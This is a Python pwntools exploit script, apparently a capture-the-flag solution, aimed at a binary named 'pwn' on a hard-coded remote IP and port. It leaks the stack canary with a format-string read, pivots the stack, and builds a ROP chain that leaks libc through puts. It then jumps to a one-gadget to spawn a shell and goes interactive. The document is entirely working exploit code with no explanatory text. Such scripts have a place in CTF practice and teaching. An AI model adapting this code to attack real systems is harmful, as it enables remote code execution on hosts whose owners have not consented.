#!/usr/bin/env python
#-*- coding:utf-8 -*-

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "39.107.88.189"
remotePort = 16451

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	stack_ = 0x601080
	leave =  0x4008e5
	pop_rdi = 0x0000000000400953
	main = 0x400813
	offset = 0x140
	ret = 0x4008e6

	p = '%13$p'
	sl(p)
	ru('0x')
	cannary = int(ru('energon'), 16)
	li('cannary: ' + hex(cannary))

	p = 'A' * offset
	p += p64(stack_ + offset + 0x10)
	p += p64(pop_rdi)
	leak_f = 'setvbuf'
	p += p64(exe.got[leak_f])
	p += p64(exe.plt['puts'])
	p += p64(main)

	s(p)

	ru('up')
	p = 'A' * 0x18
	p += p64(cannary)
	p += p64(stack_ + offset)
	p += p64(leave)
	s(p)


	leak = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	libc_base = leak - 0x06fe80
	libc_sys = libc_base + 0x0453a0
	libc_sh = libc_base + 0x18ce17
	libc_f = libc_base + 0
	li('base: ' + hex(libc_base))

	p = 'B' * (offset - 0x10)
	p += p64(stack_ + 0x180)
	p += p64(ret)
	p += p64(libc_base + 0x4527a)
	s(p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
